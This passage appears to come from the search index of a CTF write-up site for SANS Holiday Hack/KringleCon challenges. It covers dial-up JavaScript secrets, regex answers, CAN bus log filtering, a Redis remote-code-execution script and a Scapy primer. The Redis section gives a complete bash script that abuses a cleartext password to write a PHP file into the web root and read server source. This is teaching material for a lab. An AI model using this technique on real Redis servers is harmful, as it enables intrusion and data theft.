.respCrEsCl btnrespCrEsCl 3j2jc 5 aaah .ack ack 329dz 6 WEWEWEwrwrrwrr .cm_cj cm_cj 4hhdd 7 beDURRdunditty .l1_l2_info l1_l2_info hbvan3 8 SCHHHRRHHRTHRTR .trn trn djjzz The script submits the secret and a resourceID using a HTTP GET request to ensure the challenge is marked completed for the logged in player. To solve the challenge and receive credit in your badge, open a web browser JavaScript console and use secret=\"39cajd3j2jc329dz4hhddhbvan3djjzz\" to set the secret variable (1). Submit the data by copy/pasting the JQuery GET request found at the end of dialup.js (2). When you take the manual route, you'll hear a female voice stating Your lights have been updated. when sending the right sequence. In addition, when selecting the SCHHRRHHRTHRTR sound, you'll also be able to enjoy a variation of the famous Wilhelm scream where Wilhelm sounds as if he's being forced through an Espresso maker. Response \u2693\ufe0e Fitzy Shortstack \ud0e2\u0775\u05e8O\u064f\ud8da\ude36$\u0528\u0609\u694c\u0532 ahem! We did it! Thank you!! Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree...","title":"33.6kbps"},{"location":"hints/h5b/#336kbps","text":"Elf : Fitzy Shortstack Direct link : dialup website Objective : Open HID Lock","title":"33.6kbps"},{"location":"hints/h5b/#request","text":"Fitzy Shortstack \"Put it in the cloud,\" they said... \"It'll be great,\" they said... All the lights on the Christmas trees throughout the castle are controlled through a remote server. We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken! Fortunately, I speak dial-up. However, I can't quite remember the handshake sequence. Maybe you can help me out? The phone number is 756-8347; you can use this blue phone.","title":"Request"},{"location":"hints/h5b/#solution","text":"One option to solve this challenge is to iterate through all possible combinations manually. A quicker alternative is to check dialup.js and see that the script defines an event listener for each button that appends part of a code to a secret variable. 1 2 3 4 5 6 7 8 9 10 pickup . addEventListener ( 'click' , () => { if ( phase === 0 ) { phase = 1 ; playPhase (); secret += '39cajd' } else { phase = 0 ; playPhase (); } }); Follow the order defined by the different phase boolean condition statements in dialup.js to recreate the final secret value as 39cajd3j2jc329dz4hhddhbvan3djjzz . The correct order of events, CSS classes, and JavaScript variables are outlined below. Phase Action CSS class JS variable Secret added 1 Pickup the receiver .pickup pickup 39cajd 2, 3 Dial 7568347 .dtmf0 to .dtmf9 btn0 to btn9 - 4 baa DEE brrrr .respCrEsCl btnrespCrEsCl 3j2jc 5 aaah .ack ack 329dz 6 WEWEWEwrwrrwrr .cm_cj cm_cj 4hhdd 7 beDURRdunditty .l1_l2_info l1_l2_info hbvan3 8 SCHHHRRHHRTHRTR .trn trn djjzz The script submits the secret and a resourceID using a HTTP GET request to ensure the challenge is marked completed for the logged in player. To solve the challenge and receive credit in your badge, open a web browser JavaScript console and use secret=\"39cajd3j2jc329dz4hhddhbvan3djjzz\" to set the secret variable (1). Submit the data by copy/pasting the JQuery GET request found at the end of dialup.js (2). When you take the manual route, you'll hear a female voice stating Your lights have been updated. when sending the right sequence. In addition, when selecting the SCHHRRHHRTHRTR sound, you'll also be able to enjoy a variation of the famous Wilhelm scream where Wilhelm sounds as if he's being forced through an Espresso maker.","title":"Solution"},{"location":"hints/h5b/#response","text":"Fitzy Shortstack \ud0e2\u0775\u05e8O\u064f\ud8da\ude36$\u0528\u0609\u694c\u0532 ahem! We did it! Thank you!! Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust Shinny Upatree...","title":"Response"},{"location":"hints/h6/","text":"Sort-o-Matic \u2693\ufe0e Elf : Minty Candycane Direct link : regex website Objective : Splunk Challenge Request \u2693\ufe0e Minty Candycane Hey there, KringleCon attendee! I'm Minty Candycane! I'm working on fixing the Present Sort-O-Matic. The Sort-O-Matic uses JavaScript regular expressions to sort presents apart from misfit toys, but it's not working right. With some tools, regexes need / at the beginning and the ends, but they aren't used here. You can find a regular expression cheat sheet here if you need it. You can use this regex interpreter to test your regex against the required Sort-O-Matic patterns. Do you think you can help me fix it? Hints \u2693\ufe0e JavaScript Regex Cheat Sheet Handy quick reference for JS regular expression construction: https://www.debuggex.com/cheatsheet/regex/javascript Regex Practice Here's a place to try out your JS Regex expressions: https://regex101.com/ Solution \u2693\ufe0e The cheatsheet provides really all that's required to complete this challenge. Each question has a popup with examples of what should and should not be matched. Copy each example into regex101 to verify that the regex pattern works as expected. Answers Matches at least one digit: \\d{1} Matches 3 alpha a-z characters ignoring case: [a-zA-Z]{3} Matches 2 chars of lowercase a-z or numbers: [a-z0-9]{2} Matches any 2 chars not uppercase A-L or 1-5: [^A-L1-5]{2} Matches three or more digits only: ^\\d{3,}$ Matches multiple hour:minute:second time formats only: ^[0-2]?[0-9]:[0-5][0-9]:[0-5][0-9]$ Matches MAC address format only while ignoring case: ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ Matches multiple day, month, and year date formats only: ^[0-3]{1}[0-9]{1}[\\.\\/-]{1}[0-1][0-9][\\.\\/-]{1}[1-9]{4}$ Response \u2693\ufe0e Minty Candycane Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"Sort-o-Matic"},{"location":"hints/h6/#sort-o-matic","text":"Elf : Minty Candycane Direct link : regex website Objective : Splunk Challenge","title":"Sort-o-Matic"},{"location":"hints/h6/#request","text":"Minty Candycane Hey there, KringleCon attendee! I'm Minty Candycane! I'm working on fixing the Present Sort-O-Matic. The Sort-O-Matic uses JavaScript regular expressions to sort presents apart from misfit toys, but it's not working right. With some tools, regexes need / at the beginning and the ends, but they aren't used here. You can find a regular expression cheat sheet here if you need it. You can use this regex interpreter to test your regex against the required Sort-O-Matic patterns. Do you think you can help me fix it?","title":"Request"},{"location":"hints/h6/#hints","text":"JavaScript Regex Cheat Sheet Handy quick reference for JS regular expression construction: https://www.debuggex.com/cheatsheet/regex/javascript Regex Practice Here's a place to try out your JS Regex expressions: https://regex101.com/","title":"Hints"},{"location":"hints/h6/#solution","text":"The cheatsheet provides really all that's required to complete this challenge. Each question has a popup with examples of what should and should not be matched. Copy each example into regex101 to verify that the regex pattern works as expected. Answers Matches at least one digit: \\d{1} Matches 3 alpha a-z characters ignoring case: [a-zA-Z]{3} Matches 2 chars of lowercase a-z or numbers: [a-z0-9]{2} Matches any 2 chars not uppercase A-L or 1-5: [^A-L1-5]{2} Matches three or more digits only: ^\\d{3,}$ Matches multiple hour:minute:second time formats only: ^[0-2]?[0-9]:[0-5][0-9]:[0-5][0-9]$ Matches MAC address format only while ignoring case: ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ Matches multiple day, month, and year date formats only: ^[0-3]{1}[0-9]{1}[\\.\\/-]{1}[0-1][0-9][\\.\\/-]{1}[1-9]{4}$","title":"Solution"},{"location":"hints/h6/#response","text":"Minty Candycane Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"Response"},{"location":"hints/h7/","text":"CAN-Bus Investigation \u2693\ufe0e Elf : Wunorse Openslae Direct link : canbus terminal Objective : Solve the Sleigh's CAN-D-BUS Problem Request \u2693\ufe0e Wunorse Openslae Hiya hiya - I'm Wunorse Openslae! I've been playing a bit with CAN bus. Are you a car hacker? I'd love it if you could take a look at this terminal for me. I'm trying to figure out what the unlock code is in this CAN bus log. When it was grabbing this traffic, I locked, unlocked, and locked the doors one more time. It ought to be a simple matter of just filtering out the noise until we get down to those three actions. Need more of a nudge? Check out Chris Elgee's talk on CAN traffic! Hints \u2693\ufe0e CAN Bus Talk Chris Elgee is talking about how CAN traffic works right now! Filtering Text You can hide lines you don't want to see with commands like cat file.txt | grep -v badstuff Solution \u2693\ufe0e Welcome message MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Welcome to the CAN bus terminal challenge! In your home folder, there's a CAN bus capture from Santa's sleigh. Some of the data has been cleaned up, so don't worry - it isn't too noisy. What you will see is a record of the engine idling up and down. Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We'd like to encode another key mechanism. Find the decimal portion of the timestamp of the UNLOCK code in candump.log and submit it to ./runtoanswer! (e.g., if the timestamp is 123456.112233, please submit 112233) Start by reviewing the contents of the candump.log log in your home folder to understand the log format (line 1). Next, follow a process of elimination by filtering out the noisy signals using grep -v until only the LOCK/UNLOCK log entries are left. The solution below uses an alternative approach by extracting, sorting, and counting all CAN IDs using cut , sort , and uniq to find the ID that only occurs 3 times (line 2). Then using grep to extract the full log entries to retrieve the timestamps (line 3). 1 2 3 head -2 candump.log cut -c 27-30 candump.log | sort | uniq -c grep 19B# candump.log Answer 122520 Response \u2693\ufe0e Wunorse Openslae Great work! You found the code! I wonder if I can use this knowledge to work out some kind of universal unlocker... ... to be used only with permission, of course! Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. For security reasons, only Santa is allowed access to the sled and its CAN-D bus. I'll hit him up next time he's nearby.","title":"CAN-Bus Investigation"},{"location":"hints/h7/#can-bus-investigation","text":"Elf : Wunorse Openslae Direct link : canbus terminal Objective : Solve the Sleigh's CAN-D-BUS Problem","title":"CAN-Bus Investigation"},{"location":"hints/h7/#request","text":"Wunorse Openslae Hiya hiya - I'm Wunorse Openslae! I've been playing a bit with CAN bus. Are you a car hacker? I'd love it if you could take a look at this terminal for me. I'm trying to figure out what the unlock code is in this CAN bus log. When it was grabbing this traffic, I locked, unlocked, and locked the doors one more time. It ought to be a simple matter of just filtering out the noise until we get down to those three actions. Need more of a nudge? Check out Chris Elgee's talk on CAN traffic!","title":"Request"},{"location":"hints/h7/#hints","text":"CAN Bus Talk Chris Elgee is talking about how CAN traffic works right now! Filtering Text You can hide lines you don't want to see with commands like cat file.txt | grep -v badstuff","title":"Hints"},{"location":"hints/h7/#solution","text":"Welcome message MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Welcome to the CAN bus terminal challenge! In your home folder, there's a CAN bus capture from Santa's sleigh. Some of the data has been cleaned up, so don't worry - it isn't too noisy. What you will see is a record of the engine idling up and down. Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We'd like to encode another key mechanism. Find the decimal portion of the timestamp of the UNLOCK code in candump.log and submit it to ./runtoanswer! (e.g., if the timestamp is 123456.112233, please submit 112233) Start by reviewing the contents of the candump.log log in your home folder to understand the log format (line 1). Next, follow a process of elimination by filtering out the noisy signals using grep -v until only the LOCK/UNLOCK log entries are left. The solution below uses an alternative approach by extracting, sorting, and counting all CAN IDs using cut , sort , and uniq to find the ID that only occurs 3 times (line 2). Then using grep to extract the full log entries to retrieve the timestamps (line 3). 1 2 3 head -2 candump.log cut -c 27-30 candump.log | sort | uniq -c grep 19B# candump.log Answer 122520","title":"Solution"},{"location":"hints/h7/#response","text":"Wunorse Openslae Great work! You found the code! I wonder if I can use this knowledge to work out some kind of universal unlocker... ... to be used only with permission, of course! Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. For security reasons, only Santa is allowed access to the sled and its CAN-D bus. I'll hit him up next time he's nearby.","title":"Response"},{"location":"hints/h8/","text":"Redis Bug Hunt \u2693\ufe0e Elf : Holly Evergreen Direct link : redis terminal Objective : Broken Tag Generator Request \u2693\ufe0e Holly Evergreen Hi, so glad to see you! I'm Holly Evergreen. I've been working with this Redis-based terminal here. We're quite sure there's a bug in it, but we haven't caught it yet. The maintenance port is available for curling, if you'd like to investigate. Can you check the source of the index.php page and look for the bug? I read something online recently about remote code execution on Redis. That might help! I think I got close to RCE, but I get mixed up between commas and plusses. You'll figure it out, I'm sure! Hints \u2693\ufe0e Redis RCE This is kind of what we're trying to do... Solution \u2693\ufe0e Welcome message We need your help!! The server stopped working, all that's left is the maintenance port. To access it, run: curl http://localhost/maintenance.php We're pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? The solution is based on the Webshell example in the Redis pentesting guide provided by Holly Evergreen. We need to trick Redis into creating a PHP script in the web server root folder that reads and writes the contents of index.php to a non-PHP file (so we can retrieve it without the contents being parsed by the PHP interpreter). We could use the suggested curl approach, but then we'd need to URL-encode any special characters so they are properly parsed by the maintenance.php script before being forwarded to the redis-cli command line tool. Since /etc/redis/redis.conf contains the password in cleartext anyway (i.e., R3disp@ss ), we can use redis-cli directly instead. Redis DB compression Ensure that rdbcompression is disabled in /etc/redis/redis.conf . Saving the Redis database to disk with compression enabled will also compress the PHP code stored inside the DB, making the code unreadable for the PHP interpreter and preventing the PHP instructions from being executed. To automate the process create a redis_rce.sh script containing the following commands. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/env bash # Redis password from /etc/redis/redis.conf RP = 'R3disp@ss' # PHP code to copy /var/www/html/index.php to /var/www/html/f.txt PHP = \"<?php file_put_contents('f.txt', file_get_contents('index.php')); ?>\" echo -n \"Delete all keys from all databases: \" redis-cli --raw -a $RP flushall 2 >/dev/null echo -n \"Disable Redis DB compression to leave PHP code as-is: \" redis-cli --raw -a $RP config set rdbcompression no 2 >/dev/null echo -n \"Set output folder to /var/www/html/ web server root: \" redis-cli --raw -a $RP config set dir /var/www/html 2 >/dev/null echo -n \"Set the DB filename to redis_rce.php: \" redis-cli --raw -a $RP config set dbfilename redis_rce.php 2 >/dev/null echo -n \"Create 'rce' key containing PHP code: \" redis-cli --raw -a $RP set rce \" $PHP \" 2 >/dev/null echo -n \"Save Redis DB to /var/www/html/redis_rce.php: \" redis-cli --raw -a $RP save 2 >/dev/null echo \"Execute 'redis_rce.php' via GET request.\" curl http://localhost/redis_rce.php 2 >/dev/null echo \"Download http://localhost/f.txt\" curl http://localhost/f.txt --output f.txt 2 >/dev/null echo \"Display f.txt\" cat -A f.txt Execute the redis_rce.sh script on the host to find the bug. Response \u2693\ufe0e Holly Evergreen See? I knew you could to it! I wonder, could we figure out the problem with the Tag Generator if we can get the source code? Can you figure out the path to the script? I've discovered that enumerating all endpoints is a really good idea to understand an application's functionality. Sometimes I find the Content-Type header hinders the browser more than it helps. If you find a way to execute code blindly, maybe you can redirect to a file then download that file?","title":"Redis Bug Hunt"},{"location":"hints/h8/#redis-bug-hunt","text":"Elf : Holly Evergreen Direct link : redis terminal Objective : Broken Tag Generator","title":"Redis Bug Hunt"},{"location":"hints/h8/#request","text":"Holly Evergreen Hi, so glad to see you! I'm Holly Evergreen. I've been working with this Redis-based terminal here. We're quite sure there's a bug in it, but we haven't caught it yet. The maintenance port is available for curling, if you'd like to investigate. Can you check the source of the index.php page and look for the bug? I read something online recently about remote code execution on Redis. That might help! I think I got close to RCE, but I get mixed up between commas and plusses. You'll figure it out, I'm sure!","title":"Request"},{"location":"hints/h8/#hints","text":"Redis RCE This is kind of what we're trying to do...","title":"Hints"},{"location":"hints/h8/#solution","text":"Welcome message We need your help!! The server stopped working, all that's left is the maintenance port. To access it, run: curl http://localhost/maintenance.php We're pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? The solution is based on the Webshell example in the Redis pentesting guide provided by Holly Evergreen. We need to trick Redis into creating a PHP script in the web server root folder that reads and writes the contents of index.php to a non-PHP file (so we can retrieve it without the contents being parsed by the PHP interpreter). We could use the suggested curl approach, but then we'd need to URL-encode any special characters so they are properly parsed by the maintenance.php script before being forwarded to the redis-cli command line tool. Since /etc/redis/redis.conf contains the password in cleartext anyway (i.e., R3disp@ss ), we can use redis-cli directly instead. Redis DB compression Ensure that rdbcompression is disabled in /etc/redis/redis.conf . Saving the Redis database to disk with compression enabled will also compress the PHP code stored inside the DB, making the code unreadable for the PHP interpreter and preventing the PHP instructions from being executed. To automate the process create a redis_rce.sh script containing the following commands. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/env bash # Redis password from /etc/redis/redis.conf RP = 'R3disp@ss' # PHP code to copy /var/www/html/index.php to /var/www/html/f.txt PHP = \"<?php file_put_contents('f.txt', file_get_contents('index.php')); ?>\" echo -n \"Delete all keys from all databases: \" redis-cli --raw -a $RP flushall 2 >/dev/null echo -n \"Disable Redis DB compression to leave PHP code as-is: \" redis-cli --raw -a $RP config set rdbcompression no 2 >/dev/null echo -n \"Set output folder to /var/www/html/ web server root: \" redis-cli --raw -a $RP config set dir /var/www/html 2 >/dev/null echo -n \"Set the DB filename to redis_rce.php: \" redis-cli --raw -a $RP config set dbfilename redis_rce.php 2 >/dev/null echo -n \"Create 'rce' key containing PHP code: \" redis-cli --raw -a $RP set rce \" $PHP \" 2 >/dev/null echo -n \"Save Redis DB to /var/www/html/redis_rce.php: \" redis-cli --raw -a $RP save 2 >/dev/null echo \"Execute 'redis_rce.php' via GET request.\" curl http://localhost/redis_rce.php 2 >/dev/null echo \"Download http://localhost/f.txt\" curl http://localhost/f.txt --output f.txt 2 >/dev/null echo \"Display f.txt\" cat -A f.txt Execute the redis_rce.sh script on the host to find the bug.","title":"Solution"},{"location":"hints/h8/#response","text":"Holly Evergreen See? I knew you could to it! I wonder, could we figure out the problem with the Tag Generator if we can get the source code? Can you figure out the path to the script? I've discovered that enumerating all endpoints is a really good idea to understand an application's functionality. Sometimes I find the Content-Type header hinders the browser more than it helps. If you find a way to execute code blindly, maybe you can redirect to a file then download that file?","title":"Response"},{"location":"hints/h9/","text":"Scapy Prepper \u2693\ufe0e Elf : Alabaster Snowball Direct link : scapy terminal Objective : ARP Shenanigans Request \u2693\ufe0e Alabaster Snowball Welcome to the roof! Alabaster Snowball here. I'm watching some elves play NetWars! Feel free to try out our Scapy Present Packet Prepper! If you get stuck, you can help() to see how to get tasks and hints. Solution \u2693\ufe0e Welcome message \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \u2551 ___ ___ ___ ___ ___ _ _ _____ ___ _ ___ _ _____ _____ \u2551 \u2551 | _ \\ _ \\ __/ __| __| \\| |_ _| | _ \\/_\\ / __| |/ / __|_ _| \u2551 \u2551 | _/ / _|\\__ \\ _|| .` | | | | _/ _ \\ (__| ' <| _| | | \u2551 \u2551 |_| |_|_\\___|___/___|_|\\_| |_| |_|/_/ \\_\\___|_|\\_\\___| |_| \u2551 \u2551 ___ \u2551 \u2551 | _ \\_ _ ___ _ __ _ __ ___ _ _ \u2551 \u2551 | _/ '_/ -_) '_ \\ '_ \\/ -_) '_| \u2551 \u2551 |_| |_| \\___| .__/ .__/\\___|_| \u2551 \u2551 |_| |_| \u2551 \u2551 (Packets prepared with scapy) \u2551 \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d Type \"yes\" to begin. Similar to how the Linux Primer helps you to learn some common shell commands, this challenge is meant to help you get acquainted with the inner workings of the Scapy Python library. Knowing how to use Scapy to inspect and create network packets will become important when solving the ARP Shenanigans challenge. Question 1 Welcome to the \"Present Packet Prepper\" interface! The North Pole could use your help preparing present packets for shipment. Start by running the task.submit() function passing in a string argument of 'start'. Type task.help() for help on this question. task . submit ( 'start' ) Question 2 Submit the class object of the scapy module that sends packets at layer 3 of the OSI model. task . submit ( send ) Question 3 Submit the class object of the scapy module that sniffs network packets and returns those packets in a list. task . submit ( sniff ) Question 4 Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named pkt : pkt = sr1(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sniff(IP(dst=\"127.0.0.1\")/TCP(dport=20)) pkt = sendp(IP(dst=\"127.0.0.1\")/TCP(dport=20)) task . submit ( 1 ) Question 5 Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets. task . submit ( rdpcap ) Question 6 The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS : UDP_PACKETS.print() UDP_PACKETS.show() UDP_PACKETS.list() task . submit ( 2 ) Question 7 Submit only the first packet found in UDP_PACKETS . task . submit ( UDP_PACKETS [ 0 ]) Question 8 Submit only the entire TCP layer of the second packet in TCP_PACKETS . task . submit ( TCP_PACKETS [ 1 ][ TCP ]) Question 9 Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet. UDP_PACKETS [ 0 ][ IP ] . src = '127.0.0.1' task . submit ( UDP_PACKETS [ 0 ]) Question 10 Submit the password task.submit('elf_password') of the user alabaster as found in the packet list TCP_PACKETS . TCP_PACKETS . show () for x in range ( 3 , 7 ): print ( TCP_PACKETS [ x ][ Raw ] . load ) task . submit ( 'echo' ) Question 11 The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list. task . submit ( ICMP_PACKETS [ 1 ][ ICMP ] . chksum ) Question 12 Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named pkt : pkt = Ether(src='127.0.0.1')/ICMP(type=\"echo-request\") pkt = IP(src='127.0.0.1')/ICMP(type=\"echo-reply\") pkt = IP(dst='127.0.0.1')/ICMP(type=\"echo-request\") task . submit ( 3 ) Question 13 Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified). packet = Ether () / IP ( dst = '127.127.127.127' ) / UDP ( dport = 5000 ) task . submit ( packet ) Question 14 Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of \"elveslove.santa\". (all other packet attributes can be unspecified). packet = Ether () / IP ( dst = '127.2.3.4' ) / UDP ( dport = 53 ) / DNS ( qd = DNSQR ( qname = \"elveslove.santa\" )) task . submit ( packet ) Question 15 The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task. submit(ARP_PACKETS) for inspection. ARP_PACKETS [ 1 ] . show () ARP_PACKETS [ 1 ][ ARP ] . op = 2 ARP_PACKETS [ 1 ][ ARP ] . hwsrc = '00:13:46:0b:22:ba' ARP_PACKETS [ 1 ][ ARP ] . hwdst = '00:16:ce:6e:8b:24' task . submit ( ARP_PACKETS ) After answering all questions correctly you'll be a certified Scapy Present Packet Prepper operator! Response \u2693\ufe0e Alabaster Snowball Great job! Thanks! Those skills might be useful to you later on! I've been trying those skills out myself on this other terminal. I'm pretty sure I can use tcpdump to sniff some packets. Then I'm going to try a machine-in-the-middle attack. Next, I'll spoof a DNS response to point the host to my terminal. Then I want to respond to its HTTP request with something I'll cook up. I'm almost there, but I can't quite get it. I could use some help! For privacy reasons though, I can't let you access this other terminal. I do plan to ask Santa for a hand with it next time he's nearby, though.","title":"Scapy Prepper"},{"location":"hints/h9/#scapy-prepper","text":"Elf : Alabaster Snowball Direct link : scapy terminal Objective : ARP Shenanigans","title":"Scapy Prepper"},{"location":"hints/h9/#request","text":"Alabaster Snowball Welcome to the roof! Alabaster Snowball here. I'm watching some elves play NetWars! Feel free to try out our Scapy Present Packet Prepper! If you get stuck, you can help() to see how to get tasks and hints.","title":"Request"},{"location":"hints/h9/#solution","text":"Welcome message 